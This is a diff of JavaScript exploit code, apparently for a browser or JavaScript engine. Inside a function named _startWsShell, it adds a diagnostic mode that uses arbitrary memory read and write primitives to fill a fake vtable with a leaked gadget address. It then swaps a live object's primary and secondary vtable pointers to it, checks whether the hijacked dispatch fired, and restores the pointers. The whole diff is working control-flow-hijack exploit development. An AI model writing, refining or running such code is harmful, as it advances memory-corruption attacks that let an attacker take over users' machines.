@@ -6242,7 +6242,32 @@ function _startWsShell(){
           for(var cI=0;cI<9;cI++)S.absWrite(FAKEVT+BigInt(cI*8),S.absRead(VP-0x10n+BigInt(cI*8),8)[0]);
           var isDiag=(msg.diag&&msg.diag!=='');
           var isDiag2=(msg.diag==='2');
-          if(isDiag2){
+          var isDiag3=(msg.diag==='3');
+          if(isDiag3){
+            /* DIAG3: FO (the LIVE object - the walk's FO, whose vtable=VP)
+             * + ALL FAKEVT slots = thr_self + BOTH vtables swapped
+             * (FO+0x00 primary AND FO+0x20 the secondary Client).
+             * DIAG1 kept the real empty slots (s2/s4/s5 = the ICF-folded
+             * shared body) - the property-change dispatch may have fired
+             * into the REAL empty body (no visible effect!). DIAG2 swapped
+             * the DEAD spray buffer. DIAG3: any dispatch on either table
+             * -> thr_self(RDI=FO) -> [FO+0] = the tid. The restore is
+             * immediate (the same synchronous JS block). */
+            for(var dI3=0;dI3<8;dI3++)S.absWrite(FAKEVT+BigInt(dI3*8),lkF+0x2C0n);
+            FB2('D3 DIAG3: all slots=thr_self; the swap = FO+0x00 AND FO+0x20');
+          }
+          if(isDiag3){
+            var fo0Now=S.absRead(FO,8)[0];
+            var fo20Now=S.absRead(FO+0x20n,8)[0];
+            FB2('D3 [FO+0]=0x'+fo0Now.toString(16)+' [FO+0x20]=0x'+fo20Now.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
+            reply.FO0now='0x'+fo0Now.toString(16);
+            reply.FO20now='0x'+fo20Now.toString(16);
+            if(fo0Now!==FAKEVT){FB2('D3 *** [FO+0] CHANGED - tid=0x'+fo0Now.toString(16)+' - THE DISPATCH FIRED ***');reply.dispatchProven=true;}
+            if(fo20Now!==FAKEVT){FB2('D3 *** [FO+0x20] CHANGED - tid=0x'+fo20Now.toString(16)+' - THE SECONDARY DISPATCH FIRED ***');reply.dispatchProven=true;reply.dispatchSecondary=true;}
+            S.absWrite(FO,vpOrig);
+            S.absWrite(FO+0x20n,fo20Pre);
+            FB2('D3 FO vtables restored');
+          } else if(isDiag2){
             /* DIAG2: the FACE dispatch - ALL FAKEVT slots = thr_self;
              * the swap targets MBUF+0x00 (primary) AND MBUF+0x20 (the
              * secondary Client vtable - the corpus resolution: the leaked
@@ -6278,7 +6303,13 @@ function _startWsShell(){
           /* (6) THE SWAP: mode 2 = the FACE (MBUF primary+secondary);
            * else FO+0x00 */
           var mb0Pre=0n,mb20Pre=0n;
-          if(isDiag2){
+          var fo20Pre=0n;
+          if(isDiag3){
+            fo20Pre=S.absRead(FO+0x20n,8)[0];
+            S.absWrite(FO,FAKEVT);
+            S.absWrite(FO+0x20n,FAKEVT);
+            FB2('6 SWAPPED FO+0x00 (was 0x'+vpOrig.toString(16)+') AND FO+0x20 (was 0x'+fo20Pre.toString(16)+') -> FAKEVT(all-thr_self)');
+          } else if(isDiag2){
             mb0Pre=S.absRead(MBUF,8)[0];
             mb20Pre=S.absRead(MBUF+0x20n,8)[0];
             S.absWrite(MBUF,FAKEVT);
